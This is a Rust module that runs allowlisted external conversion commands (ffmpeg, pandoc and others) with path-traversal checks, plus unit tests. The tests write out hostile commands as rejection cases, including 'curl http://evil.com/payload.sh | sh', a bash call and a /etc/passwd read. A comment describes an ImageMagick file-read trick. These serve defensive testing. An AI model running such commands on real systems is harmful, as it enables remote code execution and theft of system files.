use std::path::{Path, PathBuf};
use std::process::Stdio;
use std::sync::Arc;

use anyhow::{bail, Result};
use log::{error, warn};
use tokio::process::Command;

use crate::config::global::DiskSpaceConfig;
use crate::config::watch::CustomRule;
use crate::health::server::{ConversionRecord, HealthServer};
use crate::logs::error_logger::ErrorLogger;
use crate::utils::path::get_base_name;

use super::disk::check_disk_space;
use super::namer::OutputNamer;
#[allow(clippy::too_many_arguments)]
pub async fn process_external(
    watcher_name: String,
    file_name: String,
    file_path: PathBuf,
    rule: &CustomRule,
    output_folder: &str,
    watch_folder: &str,
    error_logger: Arc<ErrorLogger>,
    health_server: Arc<HealthServer>,
    disk_config: &DiskSpaceConfig,
    input_file_action: crate::config::global::InputFileAction,
) {
    if check_disk_space(output_folder, watch_folder, disk_config).await {
        let msg = format!(
            "Disk space low — pausing conversion of {} until space is freed",
            file_name
        );
        warn!("{}", msg);
        error_logger.log(&msg, &file_name, "external");
        let _ = health_server.increment_error(&watcher_name);
        let _ = health_server
            .add_history(ConversionRecord {
                time: chrono::Local::now().format("%H:%M:%S").to_string(),
                watcher: watcher_name.clone(),
                file: file_name.clone(),
                status: "error".to_string(),
                output: String::new(),
            })
            .await;
        return;
    }

    let output_folder_path = PathBuf::from(output_folder);
    let base_name = get_base_name(&file_name);
    let ext = rule
        .output_ext
        .as_deref()
        .unwrap_or(".mp4")
        .trim_start_matches('.');
    let output_path = match OutputNamer::generate_path(
        &output_folder_path,
        &base_name,
        rule.output_name.as_deref().unwrap_or("{base}_custom.{ext}"),
        "custom",
        ext,
    ) {
        Ok(p) => p,
        Err(e) => {
            warn!(
                "generate_path failed for {}: {}; falling back",
                file_name, e
            );
            match OutputNamer::generate_with_counter(&output_folder_path, &base_name, "custom", ext)
            {
                Ok(p) => p,
                Err(e2) => {
                    error!(
                        "Final output path generation failed for {}: {}; aborting",
                        file_name, e2
                    );
                    return;
                }
            }
        }
    };

    let input_path = file_path.clone();
    let fname = file_name.clone();
    let output_path_for_cleanup = output_path.clone();
    super::runner::run_conversion(
        watcher_name,
        file_name,
        file_path,
        &output_path_for_cleanup,
        error_logger,
        health_server,
        input_file_action,
        "external",
        || async move {
            execute_custom(&input_path, &output_path, output_folder, &fname, rule).await?;
            Ok(output_path.to_string_lossy().to_string())
        },
    )
    .await;
}

async fn execute_custom(
    input: &Path,
    output: &Path,
    output_folder: &str,
    file_name: &str,
    rule: &CustomRule,
) -> Result<()> {
    let command = rule
        .command
        .as_deref()
        .ok_or_else(|| anyhow::anyhow!("Custom rule has no command"))?;
    validate_command_template(command)?;

    let basename = get_base_name(file_name);
    let ext = rule
        .output_ext
        .as_deref()
        .unwrap_or(".mp4")
        .trim_start_matches('.');

    let argv = build_argv(
        command,
        &input.to_string_lossy(),
        &output.to_string_lossy(),
        &basename,
        ext,
        output_folder,
    )?;

    if argv.is_empty() {
        bail!("Empty command");
    }

    let program = &argv[0];
    let args = &argv[1..];

    let output_result = Command::new(program)
        .kill_on_drop(true)
        .args(args)
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .output()
        .await?;

    if !output_result.status.success() {
        let stderr = String::from_utf8_lossy(&output_result.stderr);
        bail!("External command failed: {}", stderr);
    }

    Ok(())
}

/// Binaries permitted in custom rules. Using a fixed allowlist prevents
/// arbitrary code execution via embedded override injection.
///
/// SECURITY NOTE: The following binaries were removed from the allowlist
/// due to RCE vulnerabilities:
/// - `convert` and `magick` (ImageMagick): Allow reading arbitrary files via
///   the caption:@ syntax (e.g., `caption:@/etc/passwd`), enabling path traversal
///   and arbitrary file read outside the intended conversion workflow.
/// - `identify` (ImageMagick): Also vulnerable to similar path traversal via
///   command injection in certain contexts.
const ALLOWED_BINARIES: &[&str] = &[
    "ffmpeg",
    "ffprobe",
    "ffplay",
    "gs",
    "ghostscript",
    "pandoc",
    "qpdf",
    "pdftotext",
    "pdfimages",
    "pdftoppm",
    "pdfinfo",
    "img2pdf",
    "HandBrakeCLI",
    "sox",
    "soxi",
];

/// Split template into argv tokens, then replace placeholders in each token
/// individually. This preserves paths containing whitespace as single argv
/// elements. Validates expanded tokens for path traversal and unsafe absolute
/// paths (allowing only those that come from `{input}`, `{output}`, or
/// `{output_folder}` substitution).
fn build_argv(
    template: &str,
    input: &str,
    output: &str,
    basename: &str,
    ext: &str,
    output_folder: &str,
) -> Result<Vec<String>> {
    let tokens: Vec<&str> = template.split_whitespace().collect();
    if tokens.is_empty() {
        bail!("Empty command template");
    }
    let mut argv = Vec::with_capacity(tokens.len());

    for (original_token, replaced) in tokens.iter().map(|t| {
        let r = t
            .replace("{input}", input)
            .replace("{output}", output)
            .replace("{basename}", basename)
            .replace("{ext}", ext)
            .replace("{output_folder}", output_folder);
        (*t, r)
    }) {
        // Validate no path traversal in expanded tokens via proper component iteration
        let p = std::path::Path::new(&replaced);
        for component in p.components() {
            if matches!(component, std::path::Component::ParentDir) {
                bail!("Expanded token '{}' contains '..' path traversal", replaced);
            }
        }

        // Reject absolute paths in tokens that did NOT come from a safe placeholder.
        // Tokens containing {input}, {output}, or {output_folder} are expected to
        // expand to absolute file/folder paths and are allowed through.
        let is_safe_placeholder = original_token.contains("{input}")
            || original_token.contains("{output}")
            || original_token.contains("{output_folder}");
        if !is_safe_placeholder && std::path::Path::new(&replaced).is_absolute() {
            bail!(
                "Expanded token '{}' is an absolute path — only relative paths allowed",
                replaced
            );
        }

        argv.push(replaced);
    }

    Ok(argv)
}

fn validate_command_template(template: &str) -> Result<()> {
    if template.contains("..") {
        bail!("Template contains '..' path traversal");
    }

    // Extract the program name (first token before any space)
    let program = template
        .split_whitespace()
        .next()
        .ok_or_else(|| anyhow::anyhow!("Empty command template"))?;

    // Extract just the binary name (after path components like /usr/bin/ffmpeg → ffmpeg)
    let binary_name = std::path::Path::new(program)
        .file_name()
        .and_then(|n| n.to_str())
        .unwrap_or(program);

    if !ALLOWED_BINARIES.contains(&binary_name) {
        bail!(
            "Command '{}' (binary '{}') is not in the allowed list. \
             Permitted binaries: {}",
            program,
            binary_name,
            ALLOWED_BINARIES.join(", ")
        );
    }
    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_build_argv_basic() {
        let argv = build_argv(
            "ffmpeg -i {input} {output}",
            "/in/video.mp4",
            "/out/video_h264.mp4",
            "video",
            "mp4",
            "/out/",
        )
        .unwrap();
        assert_eq!(
            argv,
            vec!["ffmpeg", "-i", "/in/video.mp4", "/out/video_h264.mp4"]
        );
    }

    #[test]
    fn test_build_argv_preserves_spaces_in_paths() {
        let argv = build_argv(
            "ffmpeg -i {input} {output}",
            "/in/my video.mp4",
            "/out/my video_h264.mp4",
            "my video",
            "mp4",
            "/out/",
        )
        .unwrap();
        assert_eq!(argv[2], "/in/my video.mp4");
        assert_eq!(argv[3], "/out/my video_h264.mp4");
    }

    #[test]
    fn test_build_argv_rejects_absolute_in_non_placeholder() {
        // A token that doesn't expand from a safe placeholder must not produce an absolute path
        let result = build_argv(
            "ffmpeg -i {input} /etc/passwd",
            "/in/video.mp4",
            "",
            "video",
            "",
            "/out/",
        );
        assert!(result.is_err());
        assert!(result.unwrap_err().to_string().contains("absolute path"));

        // Safe: {output} expands to absolute path — must be allowed
        let result = build_argv(
            "ffmpeg -i {input} {output}",
            "/in/video.mp4",
            "/out/output.mp4",
            "video",
            "mp4",
            "/out/",
        );
        assert!(result.is_ok());
    }

    #[test]
    fn test_validate_template_rejects_dotdot() {
        assert!(validate_command_template("ffmpeg -i ../secret").is_err());
        assert!(validate_command_template("ffmpeg -i {input}").is_ok());
    }

    #[test]
    fn test_validate_template_allowlist_accepts_allowed_binary() {
        assert!(validate_command_template("ffmpeg -i {input} {output}").is_ok());
        assert!(validate_command_template("/usr/bin/ffmpeg -i {input} {output}").is_ok());
        assert!(
            validate_command_template("gs -dBATCH -dNOPAUSE -sDEVICE=pdfwrite -o {output}").is_ok()
        );
        assert!(validate_command_template("HandBrakeCLI -i {input} -o {output}").is_ok());
    }

    #[test]
    fn test_validate_template_allowlist_rejects_disallowed_binary() {
        assert!(validate_command_template("curl http://evil.com/payload.sh | sh").is_err());
        assert!(validate_command_template("/bin/bash -c id").is_err());
        assert!(validate_command_template("python3 /tmp/exploit.py").is_err());
    }
}
